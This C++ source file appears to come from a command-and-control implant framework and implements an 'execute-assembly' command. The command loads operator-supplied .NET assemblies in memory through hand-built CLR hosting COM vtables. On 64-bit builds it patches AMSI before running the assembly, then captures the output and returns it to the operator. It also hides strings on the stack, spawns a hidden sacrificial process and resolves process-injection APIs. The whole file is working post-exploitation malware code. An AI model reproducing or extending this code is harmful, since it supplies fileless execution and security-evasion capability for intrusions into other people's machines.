#include <common.h>
#include <commands.h>
#include <module.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <stackstr.h>

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

using namespace stardust;
using namespace starburst;

// CLR hosting COM interfaces (minimal vtable definitions)
typedef HRESULT ( WINAPI *fn_CLRCreateInstance )(
    REFCLSID clsid, REFIID riid, LPVOID* ppInterface );

typedef HRESULT ( WINAPI *fn_SafeArrayAccessData )(
    SAFEARRAY* psa, void** ppvData );
typedef HRESULT ( WINAPI *fn_SafeArrayUnaccessData )(
    SAFEARRAY* psa );
typedef SAFEARRAY* ( WINAPI *fn_SafeArrayCreate )(
    VARTYPE vt, UINT cDims, SAFEARRAYBOUND* rgsabound );
typedef SAFEARRAY* ( WINAPI *fn_SafeArrayCreateVector )(
    VARTYPE vt, LONG lLbound, ULONG cElements );
typedef HRESULT ( WINAPI *fn_SafeArrayDestroy )(
    SAFEARRAY* psa );
typedef HRESULT ( WINAPI *fn_SafeArrayPutElement )(
    SAFEARRAY* psa, LONG* rgIndices, void* pv );
typedef BSTR ( WINAPI *fn_SysAllocString )(
    const OLECHAR* psz );
typedef void ( WINAPI *fn_SysFreeString )(
    BSTR bstrString );
typedef BOOL ( WINAPI *fn_SetStdHandle )( DWORD nStdHandle, HANDLE hHandle );

static auto declfn vtable_call( void* obj, int index ) -> void* {
    auto vtbl = *reinterpret_cast<void***>( obj );
    return vtbl[index];
}

struct StackGuid {
    uint32_t Data1;
    uint16_t Data2;
    uint16_t Data3;
    uint8_t  Data4[8];
};

// minimal COM vtable stubs - we only need method indices
struct ICLRMetaHost {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* GetRuntime;            // index 3
        void* GetVersionFromFile;
        void* EnumerateInstalledRuntimes;
        void* EnumerateLoadedRuntimes;
        void* RequestRuntimeLoadedNotification;
        void* QueryLegacyV2RuntimeBinding;
        void* ExitProcess;
    } *lpVtbl;
};

struct ICLRRuntimeInfo {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* GetVersionString;      // index 3
        void* GetRuntimeDirectory;
        void* IsLoaded;
        void* LoadErrorString;
        void* LoadLibrary;
        void* GetProcAddress_ri;
        void* GetInterface;          // index 9
    } *lpVtbl;
};

struct ICorRuntimeHost {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* CreateLogicalThreadState;
        void* DeleteLogicalThreadState;
        void* SwitchInLogicalThreadState;
        void* SwitchOutLogicalThreadState;
        void* LocksHeldByLogicalThread;
        void* MapFile;
        void* GetConfiguration;
        void* Start;                 // index 10
        void* Stop;
        void* CreateDomain;
        void* GetDefaultDomain;      // index 13
        void* EnumDomains;
        void* NextDomain;
        void* CloseEnum;
        void* CreateDomainEx;
        void* CreateDomainSetup;
        void* CreateEvidence;
        void* UnloadDomain;
        void* CurrentDomain;
    } *lpVtbl;
};

auto declfn starburst::cmd_execute_assembly(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t asm_len = 0;
    auto asm_data = parser_bytes( params, &asm_len );
    uint32_t args_len = 0;
    auto args_str = parser_string( params, &args_len );

    if ( !asm_data || asm_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no assembly data" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_execute_assembly: %u bytes, args='%s'\n", asm_len, args_str ? args_str : "" );

    // fork & run: create sacrificial process with output pipe
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;

    HANDLE h_read = nullptr, h_write = nullptr;
    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
        return;
    }

    // build command line for host process
    wchar_t cmdline[512] = { 0 };
    STK_RUNTIMEBROKER(_n1);
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, _n1, -1, cmdline, 512 );

    STARTUPINFOW si = {};
    si.cb = sizeof( STARTUPINFOW );
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = h_write;
    si.hStdError = h_write;

    PROCESS_INFORMATION pi = {};
    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, cmdline, nullptr, nullptr, TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi );

    inst.kernel32.CloseHandle( h_write );

    if ( !ok ) {
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
        return;
    }

    // inject CLR loader + assembly into sacrificial process
    // allocate memory in target for assembly bytes
    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    typedef BOOL ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto pVAEx = reinterpret_cast<fn_VirtualAllocEx>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
    auto pWPM = reinterpret_cast<fn_WriteProcessMemory>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "WriteProcessMemory" ) ) );

    // for simplicity, execute assembly in-process using CLR hosting
    // terminate the sacrificial process - we'll use local CLR instead
    inst.kernel32.TerminateProcess( pi.hProcess, 0 );
    inst.kernel32.CloseHandle( pi.hProcess );
    inst.kernel32.CloseHandle( pi.hThread );
    inst.kernel32.CloseHandle( h_read );

    // local CLR hosting approach
    STK_MSCOREE(_n2);
    auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
    if ( !h_mscoree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
        return;
    }

    auto pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
        inst.kernel32.GetProcAddress( h_mscoree,
            symbol<LPCSTR>( "CLRCreateInstance" ) ) );

    if ( !pCLRCreateInstance ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
        return;
    }

    // build GUIDs on stack to avoid .rdata references (PIC-safe)
    StackGuid clsid_metahost   = { 0x9280188d, 0x0e8e, 0x4867,
        { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
    StackGuid iid_metahost     = { 0xD332DB9E, 0xB9B3, 0x4125,
        { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
    StackGuid iid_runtimeinfo  = { 0xBD39D1D2, 0xBA2F, 0x486a,
        { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
    StackGuid iid_corruntimehost = { 0xCB2F6722, 0xAB3A, 0x11d2,
        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
    StackGuid clsid_corruntimehost = { 0xCB2F6723, 0xAB3A, 0x11d2,
        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };

    // get ICLRMetaHost
    ICLRMetaHost* meta_host = nullptr;
    HRESULT hr = pCLRCreateInstance(
        *reinterpret_cast<const GUID*>( &clsid_metahost ),
        *reinterpret_cast<const GUID*>( &iid_metahost ),
        (void**)&meta_host );

    if ( FAILED( hr ) || !meta_host ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
        return;
    }

    // get runtime info for .NET 4.0
    wchar_t runtime_ver[] = { 'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', '\0' };
    ICLRRuntimeInfo* runtime_info = nullptr;

    typedef HRESULT ( __stdcall *fn_GetRuntime )(
        ICLRMetaHost*, LPCWSTR, REFIID, LPVOID* );
    auto pGetRuntime = reinterpret_cast<fn_GetRuntime>(
        meta_host->lpVtbl->GetRuntime );
    hr = pGetRuntime( meta_host, runtime_ver,
        *reinterpret_cast<const GUID*>( &iid_runtimeinfo ),
        (void**)&runtime_info );

    if ( FAILED( hr ) || !runtime_info ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetRuntime failed" ) ) );
        return;
    }

    // get ICorRuntimeHost
    ICorRuntimeHost* runtime_host = nullptr;
    typedef HRESULT ( __stdcall *fn_GetInterface )(
        ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID* );
    auto pGetInterface = reinterpret_cast<fn_GetInterface>(
        runtime_info->lpVtbl->GetInterface );
    hr = pGetInterface( runtime_info,
        *reinterpret_cast<const GUID*>( &clsid_corruntimehost ),
        *reinterpret_cast<const GUID*>( &iid_corruntimehost ),
        (void**)&runtime_host );

    if ( FAILED( hr ) || !runtime_host ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetInterface failed" ) ) );
        return;
    }

    // start CLR
    typedef HRESULT ( __stdcall *fn_Start )( ICorRuntimeHost* );
    auto pStart = reinterpret_cast<fn_Start>( runtime_host->lpVtbl->Start );
    hr = pStart( runtime_host );

    // get default AppDomain
    typedef HRESULT ( __stdcall *fn_GetDefaultDomain )( ICorRuntimeHost*, IUnknown** );
    auto pGetDefaultDomain = reinterpret_cast<fn_GetDefaultDomain>(
        runtime_host->lpVtbl->GetDefaultDomain );
    IUnknown* app_domain_unk = nullptr;
    hr = pGetDefaultDomain( runtime_host, &app_domain_unk );

    if ( FAILED( hr ) || !app_domain_unk ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
        return;
    }

    // QI for _AppDomain
    StackGuid iid_appdomain = { 0x05F696DC, 0x2B29, 0x3663,
        { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
    void* app_domain = nullptr;
    typedef HRESULT ( __stdcall *fn_QI )( IUnknown*, REFIID, void** );
    auto pQI = reinterpret_cast<fn_QI>( vtable_call( app_domain_unk, 0 ) );
    hr = pQI( app_domain_unk,
        *reinterpret_cast<const GUID*>( &iid_appdomain ),
        &app_domain );

    if ( FAILED( hr ) || !app_domain ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "QI _AppDomain failed" ) ) );
        return;
    }

    // Load oleaut32 for SAFEARRAY + BSTR
    STK_OLEAUT32(_n3);
    auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n3 );
    if ( !h_oleaut32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
        return;
    }

    auto pSafeArrayCreate = reinterpret_cast<fn_SafeArrayCreate>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayCreate" ) ) );
    auto pSafeArrayAccessData = reinterpret_cast<fn_SafeArrayAccessData>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayAccessData" ) ) );
    auto pSafeArrayUnaccessData = reinterpret_cast<fn_SafeArrayUnaccessData>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayUnaccessData" ) ) );
    auto pSafeArrayDestroy = reinterpret_cast<fn_SafeArrayDestroy>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayDestroy" ) ) );
    auto pSafeArrayCreateVector = reinterpret_cast<fn_SafeArrayCreateVector>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayCreateVector" ) ) );
    auto pSafeArrayPutElement = reinterpret_cast<fn_SafeArrayPutElement>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SafeArrayPutElement" ) ) );
    auto pSysAllocString = reinterpret_cast<fn_SysAllocString>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysAllocString" ) ) );
    auto pSysFreeString = reinterpret_cast<fn_SysFreeString>(
        inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysFreeString" ) ) );
    auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );

    if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
         !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "oleaut32 API resolution failed" ) ) );
        return;
    }

    // Load assembly via _AppDomain::Load_3(Byte[]) at vtable[45]
    SAFEARRAYBOUND bounds;
    bounds.lLbound = 0;
    bounds.cElements = asm_len;
    SAFEARRAY* sa_asm = pSafeArrayCreate( VT_UI1, 1, &bounds );
    if ( !sa_asm ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "SafeArrayCreate failed" ) ) );
        return;
    }

    void* sa_data = nullptr;
    pSafeArrayAccessData( sa_asm, &sa_data );
    memory::copy( sa_data, asm_data, asm_len );
    pSafeArrayUnaccessData( sa_asm );

    void* assembly = nullptr;
    typedef HRESULT ( __stdcall *fn_Load3 )( void*, SAFEARRAY*, void** );
    auto pLoad3 = reinterpret_cast<fn_Load3>( vtable_call( app_domain, 45 ) );
    hr = pLoad3( app_domain, sa_asm, &assembly );
    pSafeArrayDestroy( sa_asm );

    if ( FAILED( hr ) || !assembly ) {
        char err_buf[128] = { 0 };
        str_copy( err_buf, symbol<char*>( const_cast<char*>( "Load_3 failed: 0x" ) ) );
        char hex[16];
        int_to_str( hex, hr, 16 );
        str_concat( err_buf, hex );
        queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
        return;
    }

    // _Assembly::get_EntryPoint at vtable[16]
    void* method_info = nullptr;
    typedef HRESULT ( __stdcall *fn_GetEntryPoint )( void*, void** );
    auto pGetEntryPoint = reinterpret_cast<fn_GetEntryPoint>( vtable_call( assembly, 16 ) );
    hr = pGetEntryPoint( assembly, &method_info );

    if ( FAILED( hr ) || !method_info ) {
        char err_buf[128] = { 0 };
        str_copy( err_buf, symbol<char*>( const_cast<char*>( "get_EntryPoint failed: 0x" ) ) );
        char hex[16];
        int_to_str( hex, hr, 16 );
        str_concat( err_buf, hex );
        queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
        return;
    }

    // Set up stdout capture via persistent pipe (shared with powerpick)
#ifdef INCLUDE_CMD_POWERPICK
    if ( !inst.powerpick.stdout_redirected ) {
        SECURITY_ATTRIBUTES sa_pipe = {};
        sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
        sa_pipe.bInheritHandle = TRUE;
        inst.kernel32.CreatePipe(
            &inst.powerpick.pipe_read,
            &inst.powerpick.pipe_write, &sa_pipe, 0 );
        if ( pSetStdHandle ) {
            pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
            pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
        }
        inst.powerpick.stdout_redirected = true;
    }
    HANDLE h_pipe_read = inst.powerpick.pipe_read;
#else
    SECURITY_ATTRIBUTES sa_pipe = {};
    sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
    sa_pipe.bInheritHandle = TRUE;
    HANDLE h_pipe_read = nullptr, h_pipe_write = nullptr;
    inst.kernel32.CreatePipe( &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
    if ( pSetStdHandle ) {
        pSetStdHandle( STD_OUTPUT_HANDLE, h_pipe_write );
        pSetStdHandle( STD_ERROR_HANDLE, h_pipe_write );
    }
#endif

    // Build args: split arguments string into string[] for Main(string[] args)
    SAFEARRAY* sa_string_args = nullptr;
    if ( args_str && args_len > 0 ) {
        // Parse space-separated args into SAFEARRAY(BSTR)
        // Count args first
        uint32_t argc = 0;
        bool in_arg = false;
        for ( uint32_t i = 0; i < args_len; i++ ) {
            if ( args_str[i] != ' ' && !in_arg ) { argc++; in_arg = true; }
            if ( args_str[i] == ' ' ) in_arg = false;
        }
        if ( argc == 0 ) argc = 1;

        sa_string_args = pSafeArrayCreateVector( VT_BSTR, 0, argc );
        LONG idx = 0;
        uint32_t start = 0;
        in_arg = false;
        for ( uint32_t i = 0; i <= args_len; i++ ) {
            bool is_sep = ( i == args_len || args_str[i] == ' ' );
            if ( !in_arg && i < args_len && args_str[i] != ' ' ) {
                start = i;
                in_arg = true;
            }
            if ( in_arg && is_sep ) {
                uint32_t wlen = i - start + 1;
                auto wbuf = static_cast<wchar_t*>( inst.heap_alloc( wlen * sizeof( wchar_t ) ) );
                memory::zero( wbuf, wlen * sizeof( wchar_t ) );
                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, args_str + start, i - start, wbuf, wlen - 1 );
                BSTR bstr = pSysAllocString( wbuf );
                inst.heap_free( wbuf );
                pSafeArrayPutElement( sa_string_args, &idx, bstr );
                pSysFreeString( bstr );
                idx++;
                in_arg = false;
            }
        }
    } else {
        sa_string_args = pSafeArrayCreateVector( VT_BSTR, 0, 0 );
    }

    // Wrap string[] args in VARIANT, then wrap in outer SAFEARRAY(VARIANT) for Invoke_3
    VARIANT v_args;
    memory::zero( &v_args, sizeof( VARIANT ) );
    v_args.vt = VT_ARRAY | VT_BSTR;
    v_args.parray = sa_string_args;

    SAFEARRAY* sa_params_invoke = pSafeArrayCreateVector( VT_VARIANT, 0, 1 );
    LONG idx_zero = 0;
    pSafeArrayPutElement( sa_params_invoke, &idx_zero, &v_args );

    VARIANT v_obj;
    memory::zero( &v_obj, sizeof( VARIANT ) );
    v_obj.vt = VT_EMPTY;

    VARIANT v_result;
    memory::zero( &v_result, sizeof( VARIANT ) );

    #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        evasion_patch_amsi( inst );
    #endif

    // _MethodInfo::Invoke_3 at vtable[37]
    typedef HRESULT ( __stdcall *fn_Invoke3 )(
        void*, VARIANT, SAFEARRAY*, VARIANT* );
    auto pInvoke3 = reinterpret_cast<fn_Invoke3>( vtable_call( method_info, 37 ) );
    hr = pInvoke3( method_info, v_obj, sa_params_invoke, &v_result );
    DBG_PRINT( inst, "execute_assembly Invoke_3 hr=0x%08x\n", hr );

    // Read captured output
    uint8_t* output_buf = nullptr;
    uint32_t output_len = 0;
    uint32_t output_cap = 0;
    DWORD available = 0;
    DWORD bytes_read = 0;

    while ( true ) {
        if ( !inst.kernel32.PeekNamedPipe( h_pipe_read,
                nullptr, 0, nullptr, &available, nullptr ) )
            break;
        if ( available == 0 ) break;

        if ( output_len + available > output_cap ) {
            uint32_t new_cap = output_cap == 0 ? 4096 : output_cap;
            while ( new_cap < output_len + available ) new_cap *= 2;
            output_buf = static_cast<uint8_t*>( inst.heap_realloc( output_buf, new_cap ) );
            output_cap = new_cap;
        }

        bytes_read = 0;
        inst.kernel32.ReadFile( h_pipe_read,
            output_buf + output_len, available, &bytes_read, nullptr );
        output_len += bytes_read;
    }

#ifndef INCLUDE_CMD_POWERPICK
    inst.kernel32.CloseHandle( h_pipe_write );
    inst.kernel32.CloseHandle( h_pipe_read );
#endif

    pSafeArrayDestroy( sa_params_invoke );
    pSafeArrayDestroy( sa_string_args );

    if ( FAILED( hr ) ) {
        char err_msg[128] = { 0 };
        str_copy( err_msg, symbol<char*>( const_cast<char*>( "Invoke_3 failed: 0x" ) ) );
        char hex[16];
        int_to_str( hex, hr, 16 );
        str_concat( err_msg, hex );

        if ( output_buf && output_len > 0 ) {
            output_buf[output_len] = '\0';
            str_concat( err_msg, symbol<char*>( const_cast<char*>( " | " ) ) );
            str_concat( err_msg, reinterpret_cast<char*>( output_buf ) );
            inst.heap_free( output_buf );
        }

        queue_response( inst, task_uuid, RESPONSE_ERROR, err_msg );
        return;
    }

    if ( output_buf && output_len > 0 ) {
        output_buf[output_len] = '\0';
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            reinterpret_cast<char*>( output_buf ) );
        inst.heap_free( output_buf );
    } else {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "(no output)" ) ) );
    }
}

#endif
